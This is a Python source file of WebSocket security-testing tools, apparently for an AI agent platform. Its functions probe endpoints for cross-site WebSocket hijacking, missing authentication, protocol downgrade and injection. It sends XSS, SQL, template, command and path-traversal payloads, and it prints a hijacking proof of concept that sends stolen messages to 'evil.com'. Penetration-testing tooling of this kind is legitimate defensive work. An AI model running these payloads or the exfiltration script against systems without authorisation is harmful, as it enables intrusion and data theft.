"""
WebSocket Security Testing

Tests:
  - Missing Origin validation (Cross-Site WebSocket Hijacking - CSWSH)
  - Authentication bypass via WebSocket upgrade
  - Message injection (XSS, SQLi, command injection via WS messages)
  - JWT/token replay in WebSocket handshake
  - DoS via rapid message flood
  - Insecure protocol downgrade (ws:// vs wss://)
"""

from __future__ import annotations

import json
import time
import urllib.parse


from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 60


def _ws_available() -> bool:
    try:
        import websocket  # noqa
        return True
    except ImportError:
        return False


def _try_ws_connect(ws_url: str, origin: str = "", cookies: str = "",
                    token: str = "") -> dict:
    """Attempt WebSocket connection and return result dict."""
    result = {"connected": False, "status": "error", "messages": [], "error": ""}
    try:
        import websocket
        headers = []
        if origin:
            headers.append(f"Origin: {origin}")
        if cookies:
            headers.append(f"Cookie: {cookies}")
        if token:
            headers.append(f"Authorization: Bearer {token}")

        ws = websocket.WebSocket()
        ws.settimeout(10)
        ws.connect(ws_url, header=headers)
        result["connected"] = True
        result["status"] = "connected"
        # Try to receive any initial message
        ws.settimeout(3)
        try:
            msg = ws.recv()
            result["messages"].append(msg)
        except Exception:
            pass
        ws.close()
    except Exception as e:
        result["error"] = str(e)
        result["status"] = "rejected"
    return result


@function_tool()
def websocket_probe(
    ws_url: str,
    origin: str = "",
    cookies: str = "",
    token: str = "",
    test_messages: str = "",
) -> str:
    """
    Perform a security assessment of a WebSocket endpoint.

    Tests:
      1. Cross-Site WebSocket Hijacking (missing/weak Origin validation)
      2. Protocol downgrade (wss → ws)
      3. Message injection (XSS, SQLi, command injection payloads)
      4. JWT/token replay feasibility
      5. Auth bypass (connect without credentials)

    Args:
        ws_url: WebSocket endpoint URL (e.g. wss://target.com/ws or ws://target.com/chat)
        origin: Legitimate origin for baseline test (e.g. https://target.com)
        cookies: Session cookies for authenticated testing
        token: JWT/Bearer token if used for WS auth
        test_messages: JSON array of custom messages to inject
                       e.g. '[{"action":"chat","msg":"<script>alert(1)</script>"}]'

    Returns:
        WebSocket security assessment with CSWSH PoC if vulnerable
    """
    if not _ws_available():
        return (
            "websocket-client not installed.\n"
            "Install with: pip install websocket-client\n\n"
            "Manual test alternative:\n"
            f"  wscat -c '{ws_url}' --header 'Origin: https://evil.com'\n"
            f"  websocat '{ws_url}'\n"
        )

    out = [f"=== WebSocket Security Probe: {ws_url}", ""]
    findings = []

    parsed = urllib.parse.urlparse(ws_url)
    is_secure = parsed.scheme == "wss"
    base_origin = origin or f"https://{parsed.netloc}"

    # ── Test 0: Protocol security ─────────────────────────────────────────────
    out.append("── Test 0: Protocol Downgrade ──────────────────")
    if not is_secure:
        findings.append(
            "HIGH → Insecure WebSocket (ws://) — all traffic is unencrypted. "
            "Upgrade to wss://"
        )
        out.append("  [protocol] INSECURE — ws:// (no TLS encryption)")
    else:
        out.append("  [protocol] Secure — wss:// (TLS encrypted)")
        # Try downgrade
        ws_plain = ws_url.replace("wss://", "ws://")
        res = _try_ws_connect(ws_plain, origin=base_origin, cookies=cookies)
        if res["connected"]:
            findings.append(
                f"MEDIUM → Protocol downgrade accepted: {ws_plain} connects. "
                "Server allows unencrypted WebSocket connections."
            )
            out.append("  [downgrade] ws:// accepted — server allows unencrypted WS")
        else:
            out.append("  [downgrade] ws:// rejected — good")

    # ── Test 1: Legitimate connection baseline ────────────────────────────────
    out.append("")
    out.append("── Test 1: Baseline Connection ─────────────────")
    baseline = _try_ws_connect(ws_url, origin=base_origin, cookies=cookies, token=token)
    out.append(f"  [baseline] connected={baseline['connected']}  status={baseline['status']}")
    if baseline["messages"]:
        out.append(f"  [baseline] Initial message: {str(baseline['messages'][0])[:150]}")

    # ── Test 2: Cross-Site WebSocket Hijacking (CSWSH) ────────────────────────
    out.append("")
    out.append("── Test 2: Cross-Site WebSocket Hijacking ───────")
    evil_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{parsed.netloc}",
        f"https://{parsed.netloc}.evil.com",
        "",  # Missing Origin header
    ]

    for evil_origin in evil_origins:
        res = _try_ws_connect(ws_url, origin=evil_origin, cookies=cookies, token=token)
        label = repr(evil_origin) if evil_origin else "(no origin)"
        if res["connected"]:
            findings.append(
                f"CRITICAL → CSWSH: WebSocket accepts Origin={label} — "
                "server does not validate Origin header. "
                "Attacker can make victim's browser connect from any website and steal data.\n"
                "  PoC: Host on evil.com and send AJAX-style WS hijack."
            )
            out.append(f"  [cswsh origin={label}] CONNECTED ← VULNERABLE TO CSWSH!")
        else:
            out.append(f"  [cswsh origin={label}] rejected (status={res['status']})")

    # ── Test 3: Auth Bypass ───────────────────────────────────────────────────
    out.append("")
    out.append("── Test 3: Authentication Bypass ───────────────")
    res_no_auth = _try_ws_connect(ws_url, origin=base_origin)  # No cookies/token
    if res_no_auth["connected"]:
        findings.append(
            "HIGH → WebSocket connects without authentication — "
            "endpoint accessible without session cookies or token. "
            "Unauthenticated access to WebSocket functionality."
        )
        out.append("  [no-auth] CONNECTED without credentials ← AUTH BYPASS!")
    else:
        out.append(f"  [no-auth] {res_no_auth['status']} — authentication required (good)")

    # ── Test 4: Message Injection ─────────────────────────────────────────────
    out.append("")
    out.append("── Test 4: Message Injection Payloads ──────────")
    if not baseline["connected"]:
        out.append("  Skipped (baseline connection failed)")
    else:
        injection_messages = [
            '{"action":"chat","message":"<script>alert(1)</script>"}',
            '{"action":"chat","message":"\' OR \'1\'=\'1"}',
            '{"action":"chat","message":"{{7*7}}"}',
            '{"action":"get_user","userId":"1 OR 1=1"}',
            '{"__proto__":{"admin":true}}',
            '{"action":"eval","code":"process.env"}',
        ]
        if test_messages:
            try:
                custom = json.loads(test_messages)
                injection_messages = [json.dumps(m) for m in custom] + injection_messages
            except Exception:
                pass

        try:
            import websocket as ws_lib
            ws_conn = ws_lib.WebSocket()
            ws_conn.settimeout(10)
            ws_conn.connect(ws_url,
                            header=[f"Origin: {base_origin}"] +
                                   ([f"Cookie: {cookies}"] if cookies else []) +
                                   ([f"Authorization: Bearer {token}"] if token else []))

            for msg in injection_messages[:8]:
                ws_conn.send(msg)
                ws_conn.settimeout(3)
                try:
                    response = ws_conn.recv()
                    resp_lower = str(response).lower()
                    if any(ind in resp_lower for ind in
                           ["alert(1)", "script", "sql error", "49", "process.env", "admin"]):
                        findings.append(
                            f"HIGH → Message injection hit: {msg[:60]!r} "
                            f"→ response indicates payload processed: {str(response)[:100]!r}"
                        )
                        out.append(f"  [inject] {msg[:50]!r} → POSSIBLE HIT: {str(response)[:80]!r}")
                    else:
                        out.append(f"  [inject] {msg[:50]!r} → {str(response)[:60]!r}")
                except Exception:
                    out.append(f"  [inject] {msg[:50]!r} → (no response)")
            ws_conn.close()
        except Exception as e:
            out.append(f"  [inject] Error during message testing: {e}")

    # ── Summary ───────────────────────────────────────────────────────────────
    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        out.extend(findings)
        out.append("")
        out.append("CSWSH PoC (if Origin not validated):")
        out.append(f"""  <script>
    var ws = new WebSocket('{ws_url}');
    ws.onopen = function() {{ ws.send(JSON.stringify({{action:'get_data'}})); }};
    ws.onmessage = function(e) {{
      fetch('https://evil.com/steal?data=' + encodeURIComponent(e.data));
    }};
  </script>""")
    else:
        out.append("No critical WebSocket vulnerabilities detected.")

    return "\n".join(out)


@function_tool()
def websocket_fuzz(
    ws_url: str,
    message_template: str,
    fuzz_field: str,
    cookies: str = "",
    origin: str = "",
) -> str:
    """
    Fuzz a specific field in WebSocket JSON messages for injection vulnerabilities.

    Args:
        ws_url: WebSocket endpoint (wss://target.com/ws)
        message_template: JSON message template with {FUZZ} placeholder
                          e.g. '{"action":"search","query":"{FUZZ}"}'
        fuzz_field: Description of what's being fuzzed (for reporting)
        cookies: Session cookies
        origin: Origin header value

    Returns:
        Fuzzing results with potentially injectable payloads
    """
    if not _ws_available():
        return "websocket-client not installed. Run: pip install websocket-client"

    out = [f"=== WebSocket Fuzzer: {ws_url}", f"  Template: {message_template}", ""]
    findings = []

    payloads = [
        ("xss",        "<script>alert(1)</script>"),
        ("sqli",       "' OR '1'='1"),
        ("sqli_sleep", "' OR SLEEP(5)--"),
        ("ssti",       "{{7*7}}"),
        ("cmdi",       "; id"),
        ("path_trav",  "../../etc/passwd"),
        ("proto_poll", "__proto__"),
        ("nosqli",     '{"$ne": null}'),
    ]

    parsed = urllib.parse.urlparse(ws_url)
    connect_origin = origin or f"https://{parsed.netloc}"

    try:
        import websocket as ws_lib
        ws_conn = ws_lib.WebSocket()
        ws_conn.settimeout(10)
        ws_conn.connect(ws_url,
                        header=[f"Origin: {connect_origin}"] +
                               ([f"Cookie: {cookies}"] if cookies else []))

        for p_name, payload in payloads:
            msg = message_template.replace("{FUZZ}", payload)
            t0 = time.time()
            ws_conn.send(msg)
            ws_conn.settimeout(6)
            try:
                resp = ws_conn.recv()
                elapsed = time.time() - t0
                resp_str = str(resp)

                hit = False
                if p_name == "sqli_sleep" and elapsed > 4:
                    hit = True
                    findings.append(
                        f"CRITICAL → Time-based SQLi via WebSocket: {fuzz_field} "
                        f"delayed {elapsed:.1f}s with {payload!r}"
                    )
                elif any(ind in resp_str.lower() for ind in
                         ["alert(1)", "49", "uid=", "root:", "syntax error", "sql"]):
                    hit = True
                    findings.append(
                        f"HIGH → WS injection ({p_name}): {fuzz_field} reflected/errored "
                        f"with {payload!r}: {resp_str[:100]!r}"
                    )

                out.append(f"  [{p_name}] {payload[:30]!r} → {'HIT!' if hit else resp_str[:60]!r}")
            except Exception:
                elapsed = time.time() - t0
                out.append(f"  [{p_name}] {payload[:30]!r} → (no response, elapsed={elapsed:.1f}s)")

        ws_conn.close()
    except Exception as e:
        out.append(f"Connection error: {e}")

    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        out.extend(findings)
    else:
        out.append("No WebSocket injection vulnerabilities detected.")

    return "\n".join(out)
